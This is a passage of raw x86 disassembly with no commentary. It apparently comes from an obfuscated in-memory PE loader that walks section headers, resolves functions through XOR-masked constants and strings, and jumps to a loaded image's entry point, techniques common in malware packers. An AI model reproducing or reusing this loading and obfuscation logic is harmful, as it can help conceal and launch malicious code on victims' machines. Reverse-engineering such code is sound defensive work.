  41ee24:	mov    eax,DWORD PTR [edx]
  41ee26:	test   ecx,eax
  41ee28:	je     0x41ee31
  41ee2a:	not    ecx
  41ee2c:	and    eax,ecx
  41ee2e:	add    eax,DWORD PTR [ebp-0x34]
  41ee31:	mov    ecx,DWORD PTR [edx+0x4]
  41ee34:	add    ecx,DWORD PTR [ebp+0x20]
  41ee37:	push   ecx
  41ee38:	call   0x41f72c
  41ee3d:	mov    edx,DWORD PTR [ebp-0x4]
  41ee40:	mov    eax,DWORD PTR [ebp+0x18]
  41ee43:	mov    ecx,DWORD PTR [eax+0x8]
  41ee46:	xor    edx,esi
  41ee48:	add    edx,edi
  41ee4a:	cmp    ecx,edx
  41ee4c:	je     0x41ee65
  41ee4e:	push   ecx
  41ee4f:	mov    ecx,DWORD PTR [ebp+0x8]
  41ee52:	add    ecx,DWORD PTR [eax+0xc]
  41ee55:	mov    eax,DWORD PTR [eax+0x4]
  41ee58:	add    eax,DWORD PTR [ebp+0x20]
  41ee5b:	push   ecx
  41ee5c:	push   eax
  41ee5d:	call   0x41f5d3
  41ee62:	mov    eax,DWORD PTR [ebp+0x18]
  41ee65:	mov    ecx,DWORD PTR [ebp-0x24]
  41ee68:	mov    edx,DWORD PTR [ebp-0x8]
  41ee6b:	add    eax,0x28
  41ee6e:	xor    ecx,esi
  41ee70:	lea    ecx,[edx+ecx*1+0x3272e2]
  41ee77:	mov    edx,DWORD PTR [ebp+0xc]
  41ee7a:	mov    DWORD PTR [ebp+0x18],eax
  41ee7d:	mov    eax,DWORD PTR [ebp-0x24]
  41ee80:	movzx  edx,WORD PTR [edx+0x6]
  41ee84:	xor    eax,esi
  41ee86:	sub    edx,eax
  41ee88:	mov    eax,DWORD PTR [ebp+0xc]
  41ee8b:	sub    edx,edi
  41ee8d:	mov    DWORD PTR [ebp-0x8],ecx
  41ee90:	cmp    ecx,edx
  41ee92:	jbe    0x41ee18
  41ee94:	mov    edx,DWORD PTR [ebx+0x18c]
  41ee9a:	mov    ecx,DWORD PTR [ebp+0x20]
  41ee9d:	cmp    ecx,DWORD PTR [edx]
  41ee9f:	jne    0x41eec8
  41eea1:	mov    eax,DWORD PTR [ebx+0x1d8]
  41eea7:	lea    edx,[ebp-0x1c]
  41eeaa:	push   edx
  41eeab:	mov    edx,DWORD PTR [ebp-0x10]
  41eeae:	xor    edx,esi
  41eeb0:	add    edx,edi
  41eeb2:	push   edx
  41eeb3:	mov    edx,DWORD PTR [ebp-0x18]
  41eeb6:	push   DWORD PTR [edx+0x54]
  41eeb9:	push   ecx
  41eeba:	call   DWORD PTR [eax+0x1c]
  41eebd:	test   eax,eax
  41eebf:	je     0x41f131
  41eec5:	mov    eax,DWORD PTR [ebp+0xc]
  41eec8:	mov    ecx,DWORD PTR [ebx+0x1c8]
  41eece:	mov    ecx,DWORD PTR [ecx]
  41eed0:	xor    ecx,esi
  41eed2:	add    ecx,edi
  41eed4:	je     0x41f05c
  41eeda:	and    DWORD PTR [ebp-0x28],0x0
  41eede:	and    DWORD PTR [ebp+0x8],0x0
  41eee2:	mov    eax,0xf89c8519
  41eee7:	lea    ecx,[eax-0x8]
  41eeea:	mov    DWORD PTR [ebp-0x4c],0xf89c8517
  41eef1:	mov    DWORD PTR [ebp-0x48],0xf89c8509
  41eef8:	mov    DWORD PTR [ebp-0x44],eax
  41eefb:	mov    DWORD PTR [ebp-0x40],ecx
  41eefe:	mov    DWORD PTR [ebp-0x3c],ecx
  41ef01:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  41ef08:	mov    edx,DWORD PTR [ebp+0x8]
  41ef0b:	mov    ecx,0x89b
  41ef10:	xor    cx,WORD PTR [ebp+edx*4-0x4c]
  41ef15:	mov    edx,0x72e2
  41ef1a:	add    cx,dx
  41ef1d:	mov    edx,DWORD PTR [ebp+0x8]
  41ef20:	inc    DWORD PTR [ebp+0x8]
  41ef23:	cmp    DWORD PTR [ebp+0x8],0x6
  41ef27:	mov    WORD PTR [ebp+edx*2-0xb4],cx
  41ef2f:	jb     0x41ef08
  41ef31:	mov    ecx,0xf89c850b
  41ef36:	mov    DWORD PTR [ebp-0xa4],eax
  41ef3c:	mov    DWORD PTR [ebp-0x90],eax
  41ef42:	mov    DWORD PTR [ebp-0x68],eax
  41ef45:	mov    DWORD PTR [ebp-0x64],eax
  41ef48:	lea    eax,[ecx-0x1]
  41ef4b:	mov    edx,0xf89c85ff
  41ef50:	mov    DWORD PTR [ebp-0x58],eax
  41ef53:	mov    DWORD PTR [ebp-0x54],eax
  41ef56:	mov    DWORD PTR [ebp-0xa8],0xf89c85f1
  41ef60:	mov    DWORD PTR [ebp-0xa0],ecx
  41ef66:	mov    DWORD PTR [ebp-0x9c],edx
  41ef6c:	mov    DWORD PTR [ebp-0x98],0xf89c851c
  41ef76:	mov    DWORD PTR [ebp-0x94],0xf89c8517
  41ef80:	mov    DWORD PTR [ebp-0x8c],0xf89c85f8
  41ef8a:	mov    DWORD PTR [ebp-0x88],0xf89c8517
  41ef94:	mov    DWORD PTR [ebp-0x84],0xf89c8509
  41ef9e:	mov    DWORD PTR [ebp-0x80],ecx
  41efa1:	mov    DWORD PTR [ebp-0x7c],0xf89c850c
  41efa8:	mov    DWORD PTR [ebp-0x78],edx
  41efab:	mov    DWORD PTR [ebp-0x74],0xf89c8516
  41efb2:	mov    DWORD PTR [ebp-0x70],ecx
  41efb5:	mov    DWORD PTR [ebp-0x6c],0xf89c85c4
  41efbc:	mov    DWORD PTR [ebp-0x60],ecx
  41efbf:	mov    DWORD PTR [ebp-0x5c],0xf89c8518
  41efc6:	mov    DWORD PTR [ebp-0x50],0xf89c8585
  41efcd:	xor    eax,eax
  41efcf:	mov    cl,BYTE PTR [ebp+eax*4-0xa8]
  41efd6:	xor    cl,0x9b
  41efd9:	sub    cl,0x1e
  41efdc:	mov    BYTE PTR [ebp+eax*1-0xcc],cl
  41efe3:	inc    eax
  41efe4:	cmp    eax,0x17
  41efe7:	jb     0x41efcf
  41efe9:	mov    eax,DWORD PTR [ebx+0x1d8]
  41efef:	lea    ecx,[ebp-0xb4]
  41eff5:	push   ecx
  41eff6:	call   DWORD PTR [eax+0x4]
  41eff9:	mov    ecx,DWORD PTR [ebx+0x1d8]
  41efff:	lea    edx,[ebp-0xcc]
  41f005:	push   edx
  41f006:	push   eax
  41f007:	call   DWORD PTR [ecx+0x8]
  41f00a:	lea    ecx,[ebp-0x28]
  41f00d:	push   ecx
  41f00e:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f014:	push   DWORD PTR [ecx]
  41f016:	call   eax
  41f018:	mov    eax,DWORD PTR [ebp-0x28]
  41f01b:	test   eax,eax
  41f01d:	je     0x41f059
  41f01f:	mov    DWORD PTR [ebp+0x8],eax
  41f022:	jmp    0x41f02e
  41f024:	mov    eax,DWORD PTR [eax]
  41f026:	mov    DWORD PTR [ebp-0x28],eax
  41f029:	cmp    eax,DWORD PTR [ebp+0x8]
  41f02c:	je     0x41f03b
  41f02e:	mov    edx,DWORD PTR [eax+0x18]
  41f031:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f037:	cmp    edx,DWORD PTR [ecx]
  41f039:	jne    0x41f024
  41f03b:	mov    edx,DWORD PTR [eax+0x18]
  41f03e:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f044:	cmp    edx,DWORD PTR [ecx]
  41f046:	jne    0x41f059
  41f048:	mov    edx,DWORD PTR [ebp-0x18]
  41f04b:	mov    ecx,DWORD PTR [ebx+0x190]
  41f051:	mov    edx,DWORD PTR [edx+0x28]
  41f054:	add    edx,DWORD PTR [ecx]
  41f056:	mov    DWORD PTR [eax+0x1c],edx
  41f059:	mov    eax,DWORD PTR [ebp+0xc]
  41f05c:	push   ebx
  41f05d:	push   eax
  41f05e:	push   DWORD PTR [ebp+0x20]
  41f061:	call   0x41e80b
  41f066:	test   eax,eax
  41f068:	je     0x41f131
  41f06e:	push   DWORD PTR [ebp+0xc]
  41f071:	mov    ecx,ebx
  41f073:	push   DWORD PTR [ebp+0x20]
  41f076:	call   0x41e764
  41f07b:	test   eax,eax
  41f07d:	je     0x41f131
  41f083:	mov    eax,DWORD PTR [ebp+0xc]
  41f086:	mov    edx,DWORD PTR [ebp+0x20]
  41f089:	mov    ecx,ebx
  41f08b:	call   0x41e63d
  41f090:	test   eax,eax
  41f092:	je     0x41f131
  41f098:	push   ebx
  41f099:	push   DWORD PTR [ebp+0x20]
  41f09c:	call   0x41eaee
  41f0a1:	test   eax,eax
  41f0a3:	je     0x41f131
  41f0a9:	mov    eax,DWORD PTR [ebx+0x18c]
  41f0af:	mov    edx,DWORD PTR [ebp+0x20]
  41f0b2:	cmp    edx,DWORD PTR [eax]
  41f0b4:	jne    0x41f0d0
  41f0b6:	mov    eax,DWORD PTR [ebx+0x1d8]
  41f0bc:	lea    ecx,[ebp-0x1c]
  41f0bf:	push   ecx
  41f0c0:	push   DWORD PTR [ebp-0x1c]
  41f0c3:	mov    ecx,DWORD PTR [ebp-0x18]
  41f0c6:	push   DWORD PTR [ecx+0x54]
  41f0c9:	push   edx
  41f0ca:	call   DWORD PTR [eax+0x1c]
  41f0cd:	mov    edx,DWORD PTR [ebp+0x20]
  41f0d0:	mov    eax,DWORD PTR [ebx+0x1c8]
  41f0d6:	mov    eax,DWORD PTR [eax]
  41f0d8:	xor    eax,esi
  41f0da:	add    eax,edi
  41f0dc:	je     0x41f115
  41f0de:	mov    ecx,DWORD PTR [ebp+0xc]
  41f0e1:	mov    eax,DWORD PTR [ecx+0x28]
  41f0e4:	mov    DWORD PTR [ebp+0x8],0xf89ca585
  41f0eb:	mov    esi,DWORD PTR [ebp+0x8]
  41f0ee:	push   DWORD PTR [ebp+0x14]
  41f0f1:	xor    esi,0x89b
  41f0f7:	push   DWORD PTR [ebp+0x10]
  41f0fa:	add    esi,0x72e2
  41f100:	or     WORD PTR [ecx+0x16],si
  41f104:	add    eax,edx
  41f106:	push   edx
  41f107:	call   eax
  41f109:	mov    DWORD PTR [ebx+0x1d0],0xf89c8584
  41f113:	jmp    0x41f11f
  41f115:	mov    eax,DWORD PTR [ebp+0xc]
  41f118:	mov    eax,DWORD PTR [eax+0x28]
  41f11b:	add    eax,edx
  41f11d:	call   eax
  41f11f:	mov    DWORD PTR [ebp-0x8],eax
  41f122:	mov    eax,DWORD PTR [ebp-0x8]
  41f125:	mov    ecx,DWORD PTR [ebp+0x1c]
  41f128:	mov    DWORD PTR [ecx],eax
  41f12a:	mov    DWORD PTR [ebp-0x30],0x1
  41f131:	cmp    DWORD PTR [ebp-0x30],0x0
  41f135:	jne    0x41f13b
  41f137:	and    DWORD PTR [ebp+0x20],0x0
  41f13b:	mov    eax,DWORD PTR [ebp+0x20]
  41f13e:	jmp    0x41f142
  41f140:	xor    eax,eax
  41f142:	pop    edi
  41f143:	pop    esi
  41f144:	pop    ebx
  41f145:	leave  
  41f146:	ret    0x1c
  41f149:	push   ebp
  41f14a:	mov    ebp,esp
  41f14c:	movzx  edx,WORD PTR [ecx+0x6]
  41f150:	movzx  eax,WORD PTR [ecx+0x14]
  41f154:	push   ebx
  41f155:	push   edi
  41f156:	xor    edi,edi
  41f158:	lea    eax,[eax+ecx*1+0x18]
  41f15c:	test   edx,edx
  41f15e:	je     0x41f17f
  41f160:	mov    ecx,DWORD PTR [eax+0xc]
  41f163:	lea    ebx,[ecx+esi*1]
  41f166:	cmp    DWORD PTR [ebp+0x8],ebx
  41f169:	jb     0x41f177
  41f16b:	mov    ebx,DWORD PTR [eax+0x8]
  41f16e:	add    ebx,ecx
  41f170:	add    ebx,esi
  41f172:	cmp    DWORD PTR [ebp+0x8],ebx
  41f175:	jb     0x41f181
  41f177:	add    eax,0x28
  41f17a:	inc    edi
  41f17b:	cmp    edi,edx
  41f17d:	jb     0x41f160
  41f17f:	xor    eax,eax
  41f181:	pop    edi
  41f182:	pop    ebx
  41f183:	pop    ebp
  41f184:	ret    0x4
  41f187:	push   ebp
  41f188:	mov    ebp,esp
  41f18a:	sub    esp,0x34
  41f18d:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  41f194:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41f19b:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  41f1a2:	mov    DWORD PTR [ebp-0x8],0xf89c85e4
  41f1a9:	mov    DWORD PTR [ebp-0x20],0xf89c85c4
  41f1b0:	mov    DWORD PTR [ebp-0x2c],0xf89c8503
  41f1b7:	mov    DWORD PTR [ebp-0x2c],0xf89c85e3
  41f1be:	mov    DWORD PTR [ebp-0x10],eax
  41f1c1:	mov    eax,DWORD PTR [ebp+0x8]
  41f1c4:	mov    DWORD PTR [ebp-0x14],eax
  41f1c7:	mov    eax,DWORD PTR [ebp-0xc]
  41f1ca:	push   ebx
  41f1cb:	mov    ecx,0x751089b
  41f1d0:	xor    eax,ecx
  41f1d2:	push   esi
  41f1d3:	mov    esi,DWORD PTR [ebp-0x10]
  41f1d6:	mov    edx,0x3272e2
  41f1db:	add    eax,edx
  41f1dd:	push   edi
  41f1de:	cmp    esi,eax
  41f1e0:	je     0x41f3bf
  41f1e6:	mov    eax,DWORD PTR [ebp-0xc]
  41f1e9:	mov    esi,DWORD PTR [ebp-0x14]
  41f1ec:	xor    eax,ecx
  41f1ee:	add    eax,edx
  41f1f0:	cmp    esi,eax
  41f1f2:	je     0x41f3bf
  41f1f8:	mov    eax,DWORD PTR [ebp-0xc]
  41f1fb:	xor    eax,ecx
  41f1fd:	add    eax,edx
  41f1ff:	mov    DWORD PTR [ebp-0x24],eax
  41f202:	mov    eax,DWORD PTR [ebp-0xc]
  41f205:	xor    eax,ecx
  41f207:	add    eax,edx
  41f209:	mov    DWORD PTR [ebp-0x28],eax
  41f20c:	mov    edi,DWORD PTR [ebp-0x20]
  41f20f:	mov    ebx,DWORD PTR [ebp-0x8]
  41f212:	mov    esi,0x89b
  41f217:	xor    edi,esi
  41f219:	mov    eax,0x72e2
  41f21e:	xor    ebx,esi
  41f220:	add    edi,eax
  41f222:	add    ebx,eax
  41f224:	sub    ebx,edi
  41f226:	mov    WORD PTR [ebp-0x8],bx
  41f22a:	jmp    0x41f2ef
  41f22f:	mov    edi,DWORD PTR [ebp-0xc]
  41f232:	mov    bx,WORD PTR [ebp-0x4]
  41f236:	xor    edi,esi
  41f238:	add    edi,eax
  41f23a:	cmp    bx,di
  41f23d:	je     0x41f331
  41f243:	mov    edi,DWORD PTR [ebp-0xc]
  41f246:	mov    ebx,DWORD PTR [ebp+0xc]
  41f249:	xor    edi,ecx
  41f24b:	add    edi,edx
  41f24d:	cmp    ebx,edi
  41f24f:	mov    di,WORD PTR [ebp-0x4]
  41f253:	mov    bx,WORD PTR [ebp+0x8]
  41f257:	je     0x41f2c2
  41f259:	cmp    bx,di
  41f25c:	je     0x41f2cb
  41f25e:	mov    edi,DWORD PTR [ebp-0x20]
  41f261:	mov    bx,WORD PTR [ebp+0x8]
  41f265:	xor    edi,esi
  41f267:	add    edi,eax
  41f269:	cmp    bx,di
  41f26c:	jb     0x41f28c
  41f26e:	mov    edi,DWORD PTR [ebp-0x2c]
  41f271:	mov    bx,WORD PTR [ebp+0x8]
  41f275:	xor    edi,esi
  41f277:	add    edi,eax
  41f279:	cmp    bx,di
  41f27c:	ja     0x41f28c
  41f27e:	movzx  edi,WORD PTR [ebp+0x8]
  41f282:	movzx  ebx,WORD PTR [ebp-0x8]
  41f286:	add    edi,ebx
  41f288:	mov    WORD PTR [ebp+0x8],di
  41f28c:	mov    edi,DWORD PTR [ebp-0x20]
  41f28f:	mov    bx,WORD PTR [ebp-0x4]
  41f293:	xor    edi,esi
  41f295:	add    edi,eax
  41f297:	cmp    bx,di
  41f29a:	jb     0x41f2ba
  41f29c:	mov    edi,DWORD PTR [ebp-0x2c]
  41f29f:	mov    bx,WORD PTR [ebp-0x4]
  41f2a3:	xor    edi,esi
  41f2a5:	add    edi,eax
  41f2a7:	cmp    bx,di
  41f2aa:	ja     0x41f2ba
  41f2ac:	movzx  edi,WORD PTR [ebp-0x4]
  41f2b0:	movzx  ebx,WORD PTR [ebp-0x8]
  41f2b4:	add    edi,ebx
  41f2b6:	mov    WORD PTR [ebp-0x4],di
  41f2ba:	mov    di,WORD PTR [ebp-0x4]
  41f2be:	mov    bx,WORD PTR [ebp+0x8]
  41f2c2:	cmp    bx,di
  41f2c5:	jne    0x41f3bf
  41f2cb:	mov    edi,DWORD PTR [ebp-0x1c]
  41f2ce:	mov    ebx,DWORD PTR [ebp-0x10]
  41f2d1:	xor    edi,ecx
  41f2d3:	lea    edi,[edi+ebx*1+0x3272e2]
  41f2da:	mov    DWORD PTR [ebp-0x10],edi
  41f2dd:	mov    edi,DWORD PTR [ebp-0x1c]
  41f2e0:	mov    ebx,DWORD PTR [ebp-0x14]
  41f2e3:	xor    edi,ecx
  41f2e5:	lea    edi,[edi+ebx*1+0x3272e2]
  41f2ec:	mov    DWORD PTR [ebp-0x14],edi
  41f2ef:	mov    edi,DWORD PTR [ebp-0x24]
  41f2f2:	mov    ebx,DWORD PTR [ebp-0x10]
  41f2f5:	mov    di,WORD PTR [ebx+edi*2]
  41f2f9:	mov    WORD PTR [ebp+0x8],di
  41f2fd:	mov    edi,DWORD PTR [ebp-0x28]
  41f300:	mov    ebx,DWORD PTR [ebp-0x14]
  41f303:	mov    di,WORD PTR [ebx+edi*2]
  41f307:	mov    WORD PTR [ebp-0x4],di
  41f30b:	mov    edi,DWORD PTR [ebp-0xc]
  41f30e:	mov    bx,WORD PTR [ebp+0x8]
  41f312:	xor    edi,esi
  41f314:	add    edi,eax
  41f316:	cmp    bx,di
  41f319:	jne    0x41f22f
  41f31f:	mov    eax,DWORD PTR [ebp-0x18]
  41f322:	mov    esi,DWORD PTR [ebp-0xc]
  41f325:	xor    eax,ecx
  41f327:	add    eax,edx
  41f329:	imul   eax,esi
  41f32c:	mov    DWORD PTR [ebp-0xc],eax
  41f32f:	jmp    0x41f343
  41f331:	mov    eax,DWORD PTR [ebp-0xc]
  41f334:	mov    esi,DWORD PTR [ebp-0x18]
  41f337:	xor    eax,ecx
  41f339:	lea    eax,[eax+esi*1+0x3272e2]
  41f340:	mov    DWORD PTR [ebp-0x18],eax
  41f343:	mov    eax,DWORD PTR [ebp-0x24]
  41f346:	sub    eax,edx
  41f348:	xor    eax,ecx
  41f34a:	mov    DWORD PTR [ebp-0x30],eax
  41f34d:	mov    eax,DWORD PTR [ebp-0x28]
  41f350:	sub    eax,edx
  41f352:	xor    eax,ecx
  41f354:	mov    DWORD PTR [ebp-0x34],eax
  41f357:	mov    eax,DWORD PTR [ebp-0x34]
  41f35a:	mov    esi,DWORD PTR [ebp-0x1c]
  41f35d:	xor    esi,ecx
  41f35f:	add    esi,edx
  41f361:	xor    eax,ecx
  41f363:	add    eax,0x3272e2
  41f368:	imul   esi,eax
  41f36b:	mov    eax,DWORD PTR [ebp-0x14]
  41f36e:	movzx  eax,WORD PTR [esi+eax*1]
  41f372:	mov    esi,DWORD PTR [ebp-0x30]
  41f375:	mov    edi,DWORD PTR [ebp-0x1c]
  41f378:	xor    esi,ecx
  41f37a:	add    esi,edx
  41f37c:	xor    edi,ecx
  41f37e:	add    edi,edx
  41f380:	imul   edi,esi
  41f383:	mov    esi,DWORD PTR [ebp-0x10]
  41f386:	movzx  esi,WORD PTR [edi+esi*1]
  41f38a:	sub    eax,edx
  41f38c:	sub    esi,edx
  41f38e:	xor    eax,ecx
  41f390:	xor    esi,ecx
  41f392:	cmp    esi,eax
  41f394:	jne    0x41f3bf
  41f396:	mov    eax,DWORD PTR [ebp-0x30]
  41f399:	mov    esi,DWORD PTR [ebp-0x1c]
  41f39c:	xor    eax,ecx
  41f39e:	add    eax,0x3272e2
  41f3a3:	xor    esi,ecx
  41f3a5:	add    esi,edx
  41f3a7:	imul   esi,eax
  41f3aa:	mov    eax,DWORD PTR [ebp-0x10]
  41f3ad:	movzx  eax,WORD PTR [esi+eax*1]
  41f3b1:	mov    esi,DWORD PTR [ebp-0xc]
  41f3b4:	sub    eax,edx
  41f3b6:	xor    eax,ecx
  41f3b8:	cmp    eax,esi
  41f3ba:	mov    eax,DWORD PTR [ebp-0xc]
  41f3bd:	je     0x41f3c2
  41f3bf:	mov    eax,DWORD PTR [ebp-0x18]
  41f3c2:	pop    edi
  41f3c3:	xor    eax,ecx
  41f3c5:	pop    esi
  41f3c6:	add    eax,edx
  41f3c8:	pop    ebx
  41f3c9:	leave  
  41f3ca:	ret    0x8
  41f3cd:	push   ebp
  41f3ce:	mov    ebp,esp
  41f3d0:	push   ecx
  41f3d1:	mov    cx,WORD PTR [eax]
  41f3d4:	push   esi
  41f3d5:	mov    esi,0x3b51
  41f3da:	sub    cx,si
  41f3dd:	mov    esi,0x8a8d
  41f3e2:	xor    cx,si
  41f3e5:	mov    esi,0x4e22
  41f3ea:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f3f1:	mov    edx,0xf89c8585
  41f3f6:	cmp    cx,si
  41f3f9:	je     0x41f458
  41f3fb:	push   ebx
  41f3fc:	push   edi
  41f3fd:	movzx  ecx,cx
  41f400:	mov    edi,0xffcd8d1e
  41f405:	mov    esi,0x751089b
  41f40a:	mov    ebx,0x4f86
  41f40f:	cmp    cx,bx
  41f412:	jne    0x41f417
  41f414:	mov    DWORD PTR [ebp-0x4],edx
  41f417:	lea    edx,[edi+0x1]
  41f41a:	xor    edx,esi
  41f41c:	mov    edi,edx
  41f41e:	xor    edi,esi
  41f420:	mov    cx,WORD PTR [eax+edi*2+0x64e5c4]
  41f428:	mov    ebx,0x3b51
  41f42d:	sub    cx,bx
  41f430:	mov    ebx,0x8a8d
  41f435:	xor    cx,bx
  41f438:	mov    ebx,0x4e22
  41f43d:	cmp    cx,bx
  41f440:	jne    0x41f40a
  41f442:	mov    ecx,DWORD PTR [ebp-0x4]
  41f445:	pop    edi
  41f446:	pop    ebx
  41f447:	cmp    ecx,0xf89c8586
  41f44d:	je     0x41f458
  41f44f:	xor    ecx,esi
  41f451:	lea    eax,[eax+ecx*2+0x64e5c6]
  41f458:	pop    esi
  41f459:	leave  
  41f45a:	ret    
  41f45b:	push   ebp
  41f45c:	mov    ebp,esp
  41f45e:	push   ecx
  41f45f:	push   esi
  41f460:	push   edi
  41f461:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f468:	mov    esi,0xf89c8585
  41f46d:	call   0x41f3cd
  41f472:	mov    edi,eax
  41f474:	mov    al,BYTE PTR [edi]
  41f476:	add    al,0x8
  41f478:	xor    al,0x74
  41f47a:	cmp    al,0x7c
  41f47c:	je     0x41f4df
  41f47e:	mov    eax,edi
  41f480:	mov    edx,0xffcd8d1e
  41f485:	mov    ecx,0x751089b
  41f48a:	push   ebx
  41f48b:	mov    ax,WORD PTR [eax]
  41f48e:	mov    ebx,0x3b51
  41f493:	sub    ax,bx
  41f496:	mov    ebx,0x8a8d
  41f49b:	xor    ax,bx
  41f49e:	mov    ebx,0x4e50
  41f4a3:	cmp    ax,bx
  41f4a6:	jne    0x41f4ab
  41f4a8:	mov    DWORD PTR [ebp-0x4],esi
  41f4ab:	lea    esi,[edx+0x1]
  41f4ae:	xor    esi,ecx
  41f4b0:	mov    edx,esi
  41f4b2:	xor    edx,ecx
  41f4b4:	lea    eax,[edi+edx*2+0x64e5c4]
  41f4bb:	mov    bl,BYTE PTR [eax]
  41f4bd:	add    bl,0x8
  41f4c0:	xor    bl,0x74
  41f4c3:	cmp    bl,0x7c
  41f4c6:	jne    0x41f48b
  41f4c8:	mov    eax,DWORD PTR [ebp-0x4]
  41f4cb:	pop    ebx
  41f4cc:	cmp    eax,0xf89c8586
  41f4d1:	je     0x41f4df
  41f4d3:	xor    eax,ecx
  41f4d5:	xor    ecx,ecx
  41f4d7:	mov    WORD PTR [edi+eax*2+0x64e5c4],cx
  41f4df:	mov    eax,edi
  41f4e1:	pop    edi
  41f4e2:	pop    esi
  41f4e3:	leave  
  41f4e4:	ret    
  41f4e5:	push   ebp
  41f4e6:	mov    ebp,esp
  41f4e8:	push   ecx
  41f4e9:	push   esi
  41f4ea:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f4f1:	mov    esi,0xf89c8585
  41f4f6:	call   0x41f3cd
  41f4fb:	mov    cx,WORD PTR [eax]
  41f4fe:	mov    edx,0x3b51
  41f503:	sub    cx,dx
  41f506:	mov    edx,0x8a8d
  41f50b:	xor    cx,dx
  41f50e:	mov    edx,0x4e22
  41f513:	cmp    cx,dx
  41f516:	je     0x41f56f
  41f518:	push   ebx
  41f519:	push   edi
  41f51a:	movzx  ecx,cx
  41f51d:	mov    edx,0xffcd8d1e
  41f522:	mov    edi,0x751089b
  41f527:	mov    ebx,0x4e50
  41f52c:	cmp    cx,bx
  41f52f:	jne    0x41f534
  41f531:	mov    DWORD PTR [ebp-0x4],esi
  41f534:	lea    esi,[edx+0x1]
  41f537:	xor    esi,edi
  41f539:	mov    edx,esi
  41f53b:	xor    edx,edi
  41f53d:	mov    cx,WORD PTR [eax+edx*2+0x64e5c4]
  41f545:	mov    ebx,0x3b51
  41f54a:	sub    cx,bx
  41f54d:	mov    ebx,0x8a8d
  41f552:	xor    cx,bx
  41f555:	mov    ebx,0x4e22
  41f55a:	cmp    cx,bx
  41f55d:	jne    0x41f527
  41f55f:	cmp    DWORD PTR [ebp-0x4],0xf89c8586
  41f566:	pop    edi
  41f567:	pop    ebx
  41f568:	je     0x41f56f
  41f56a:	xor    eax,eax
  41f56c:	inc    eax
  41f56d:	jmp    0x41f571
  41f56f:	xor    eax,eax
  41f571:	pop    esi
  41f572:	leave  
  41f573:	ret    
  41f574:	push   ebp
  41f575:	mov    ebp,esp
  41f577:	push   ecx
  41f578:	mov    eax,DWORD PTR [ebp+0x8]
  41f57b:	movzx  ecx,WORD PTR [eax]
  41f57e:	push   esi
  41f57f:	lea    eax,[ecx-0x3b51]
  41f585:	mov    esi,0x8a8d
  41f58a:	push   edi
  41f58b:	xor    eax,esi
  41f58d:	mov    edi,0x4e22
  41f592:	mov    DWORD PTR [ebp-0x4],edx
  41f595:	cmp    ax,di
  41f598:	je     0x41f5c5
  41f59a:	mov    eax,DWORD PTR [ebp+0x8]
  41f59d:	sub    eax,edx
  41f59f:	mov    DWORD PTR [ebp+0x8],eax
  41f5a2:	jmp    0x41f5a7
  41f5a4:	mov    eax,DWORD PTR [ebp+0x8]
  41f5a7:	mov    WORD PTR [edx],cx
  41f5aa:	add    edx,0x2
  41f5ad:	movzx  edi,WORD PTR [eax+edx*1]
  41f5b1:	mov    ecx,edi
  41f5b3:	add    edi,0xffffc4af
  41f5b9:	xor    edi,esi
  41f5bb:	mov    eax,0x4e22
  41f5c0:	cmp    di,ax
  41f5c3:	jne    0x41f5a4
  41f5c5:	xor    eax,eax
  41f5c7:	pop    edi
  41f5c8:	mov    WORD PTR [edx],ax
  41f5cb:	mov    eax,DWORD PTR [ebp-0x4]
  41f5ce:	pop    esi
  41f5cf:	leave  
  41f5d0:	ret    0x4
  41f5d3:	push   ebp
  41f5d4:	mov    ebp,esp
  41f5d6:	sub    esp,0x18
  41f5d9:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41f5e0:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41f5e7:	mov    eax,DWORD PTR [ebp-0x14]
  41f5ea:	xor    eax,0x751089b
  41f5ef:	add    eax,0x3272e2
  41f5f4:	mov    DWORD PTR [ebp-0x8],eax
  41f5f7:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  41f5fe:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  41f605:	mov    DWORD PTR [ebp-0x4],0xf89c85bb
  41f60c:	mov    eax,DWORD PTR [ebp-0x14]
  41f60f:	xor    eax,0x751089b
  41f614:	mov    ecx,DWORD PTR [ebp-0x8]
  41f617:	lea    eax,[ecx+eax*1+0x3272e2]
  41f61e:	mov    ecx,DWORD PTR [ebp-0x18]
  41f621:	xor    ecx,0x751089b
  41f627:	add    ecx,0x3272e2
  41f62d:	mov    edx,DWORD PTR [ebp+0x10]
  41f630:	imul   edx,ecx
  41f633:	cmp    eax,edx
  41f635:	jae    0x41f728
  41f63b:	mov    eax,DWORD PTR [ebp+0x10]
  41f63e:	mov    ecx,DWORD PTR [ebp-0x8]
  41f641:	sub    eax,ecx
  41f643:	mov    ecx,DWORD PTR [ebp-0x10]
  41f646:	xor    ecx,0x751089b
  41f64c:	add    ecx,0x3272e2
  41f652:	cmp    eax,ecx
  41f654:	jbe    0x41f686
  41f656:	mov    eax,DWORD PTR [ebp+0x8]
  41f659:	add    eax,DWORD PTR [ebp-0x8]
  41f65c:	mov    ecx,DWORD PTR [ebp+0xc]
  41f65f:	add    ecx,DWORD PTR [ebp-0x8]
  41f662:	mov    edx,DWORD PTR [ecx]
  41f664:	mov    DWORD PTR [eax],edx
  41f666:	mov    ecx,DWORD PTR [ecx+0x4]
  41f669:	mov    DWORD PTR [eax+0x4],ecx
  41f66c:	mov    eax,DWORD PTR [ebp-0x10]
  41f66f:	xor    eax,0x751089b
  41f674:	mov    ecx,DWORD PTR [ebp-0x8]
  41f677:	lea    eax,[ecx+eax*1+0x3272e2]
  41f67e:	mov    DWORD PTR [ebp-0x8],eax
  41f681:	jmp    0x41f723
  41f686:	mov    eax,DWORD PTR [ebp+0x10]
  41f689:	mov    ecx,DWORD PTR [ebp-0x8]
  41f68c:	sub    eax,ecx
  41f68e:	mov    ecx,DWORD PTR [ebp-0xc]
  41f691:	xor    ecx,0x751089b
  41f697:	add    ecx,0x3272e2
  41f69d:	cmp    eax,ecx
  41f69f:	jbe    0x41f6c8
  41f6a1:	mov    eax,DWORD PTR [ebp+0x8]
